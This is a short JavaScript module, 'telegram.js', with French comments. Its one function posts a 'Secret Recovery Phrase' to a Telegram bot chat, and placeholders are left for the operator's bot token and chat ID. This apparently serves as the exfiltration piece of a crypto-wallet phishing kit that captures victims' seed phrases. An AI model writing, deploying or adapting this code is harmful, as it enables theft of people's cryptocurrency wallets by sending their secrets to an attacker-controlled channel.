// telegram.js

export function sendToTelegram(phrase) {
  const botToken = "YOUR_BOT_TOKEN_HERE"; // remplace par ton token
  const chatId = "YOUR_CHAT_ID_HERE";     // remplace par ton chat ID

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: "Secret Recovery Phrase:\n" + phrase.trim()
    })
  });
}
